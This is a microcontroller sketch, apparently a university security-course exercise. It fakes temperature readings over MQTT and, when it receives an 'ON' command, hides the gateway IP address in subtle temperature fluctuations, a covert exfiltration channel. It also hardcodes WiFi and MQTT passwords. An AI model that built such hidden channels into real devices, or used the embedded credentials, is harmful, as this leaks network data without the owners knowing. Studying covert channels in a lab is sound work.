
#include <WiFi.h>
#include <sstream>
#include <iomanip>
#include <PubSubClient.h> // MQTT Client
#include <optional>

const char*  ssid         = "DNA-BEB67ACC9960";
const char*  password     = "59EC2EEA2846";

const char*  mqtt_server  = "syssec.eemcs.utwente.nl";
const int    mqtt_port    = 1883;
const char*  mqtt_user    = "wemos11";
const char*  mqtt_pass    = "dfX1a0KUkE";

long         current_temp = 2000;
const int    min_temp     = 1000;
const int    max_temp     = 4000;

WiFiClient   wifi_client;
PubSubClient pubsub_client(wifi_client);

enum CovertChannelState {
    active,
    inactive,
};

uint8_t ip_bits[32];
uint8_t last_x = 0;
CovertChannelState covert_channel_state = inactive;
CovertChannelState next_covert_channel_state = inactive;

void did_receive_mqtt_data(char* topic, byte* payload, unsigned int length);
void normal_temperature_reading();

void setup() {
    randomSeed(analogRead(0));

    Serial.begin(115200);
    WiFi.begin(ssid, password);

    while (WiFi.status() != WL_CONNECTED) {
        delay(500);
        Serial.println("Connecting to WiFi..");
    }

    pubsub_client.setServer(mqtt_server, mqtt_port);
    pubsub_client.setCallback(did_receive_mqtt_data);

    String ip = WiFi.gatewayIP().toString();
    Serial.print("ip address is: ");
    Serial.println(ip);
    uint8_t ip_bytes[4]; 
    sscanf(ip.c_str(), "%hhu.%hhu.%hhu.%hhu", ip_bytes, ip_bytes + 1, ip_bytes + 2, ip_bytes + 3);
    int i = 31;
    for (int byte_index = 3; byte_index >= 0; byte_index--) {
        for (int bit_index = 0; bit_index < 8; bit_index++) {
            uint8_t current_bit = (ip_bytes[byte_index] & (1 << bit_index)) >> bit_index;
            ip_bits[i--] = current_bit;
        }
    }
    for (int bit_index = 0; bit_index < 32; bit_index++) {
        Serial.print(ip_bits[bit_index]);
        if (bit_index > 0 && bit_index % 8 == 0) {
            Serial.print(".");
        }
    }
    Serial.println("");
}

std::string float_to_string(float value) {
    std::ostringstream stream;
    stream << std::fixed << std::setprecision(2) << value;
    return stream.str();
}

void reconnect() {
    // Loop until we're reconnected
    while (!pubsub_client.connected()) {
        Serial.print("Attempting MQTT connection...");

        // Attempt to connect
        if (pubsub_client.connect("", mqtt_user, mqtt_pass)) {
            Serial.println("connected");
        } else {
            Serial.print("failed, rc=");
            Serial.print(pubsub_client.state());
            Serial.println(" try again in 5 seconds");
            delay(5000);
        }
    }
}

void covert_temperature_reading() {
    static int current_bit_index = 0;
    static int add_or_sub = 0;
    
    if (current_bit_index == 32) {
        current_bit_index = 0;
        add_or_sub = 0;
        next_covert_channel_state = inactive;
        Serial.println();
        normal_temperature_reading();
        return;
    }

    uint8_t x = 0;
    for (int i = 0; i < 4; i++) {
        x |= ip_bits[current_bit_index + i] << i;
        Serial.printf("%d", ip_bits[current_bit_index + i]);
    }
    current_bit_index += 4;
    last_x = x;

    if (add_or_sub)
        current_temp += x;
    else 
        current_temp -= x;

    add_or_sub = !add_or_sub;
}

void normal_temperature_reading() {
    current_temp += random(-10, 10);

    if (current_temp % 100 == 0) {
        current_temp += (random(0, 1) * 2) - 1;
    }

    // Ensure fake temperature is within reasonable bounds.
    if (current_temp < min_temp)
        current_temp = min_temp;
    else if (current_temp > max_temp)
        current_temp = max_temp;
}

float get_next_temperature_reading() {
    // Fake the sensor data by randomly fluctuate the temperature.
    if (covert_channel_state != next_covert_channel_state) {
        int current_temp_digits = current_temp % 100;
        if (current_temp_digits > 50) {
            if (current_temp_digits >= 90) {
                current_temp += 100 - current_temp_digits;
                covert_channel_state = next_covert_channel_state;
            } else {
                current_temp += random(0, 10);
            }
        } else {
            // current_temp_digits <= 50
            if (current_temp_digits <= 10) {
                current_temp -= current_temp_digits;
                covert_channel_state = next_covert_channel_state;
            } else {
                current_temp -= random(0, 10);
            }
        }
    } else if (covert_channel_state == active) {
        covert_temperature_reading();
    } else if (covert_channel_state == inactive) {
        normal_temperature_reading();
    }

    return (float) current_temp / 100.0f;
}

void publish_temperature_data(float value) {
    // Construct topic string.
    std::string username(mqtt_user, 7);
    std::string topic = "temperature/" + username + "/sensor";

    // Convert temperature to a string message.
    std::string msg = float_to_string(value);

    // Serial.print("Publishing temperature data [");
    // Serial.print(topic.c_str());
    // Serial.print("] ");
    // Serial.println(msg.c_str());

    // Publish!
    pubsub_client.publish(topic.c_str(), msg.c_str(), msg.length());
}

void did_receive_mqtt_data(char* topic, byte* payload, unsigned int length) {
    if (covert_channel_state == active || next_covert_channel_state == active) {
        return;
    }
    // covert_channel_state == inactive && next_covert_channel_state == inactive
    if (length == 2 && payload[0] == 'O' && payload[1] == 'N') {
        // payload == "ON"
        next_covert_channel_state = active;
    }
}

void loop() {
    // Reconnect if we lost connection.
    if (!pubsub_client.connected()) {
        reconnect();
        pubsub_client.subscribe("led/wemos11/action");
    }

    // Read some data and publish it.
    float temperature = get_next_temperature_reading();
    publish_temperature_data(temperature);

    // First receive mqtt data
    pubsub_client.loop();

    delay(10); 
}
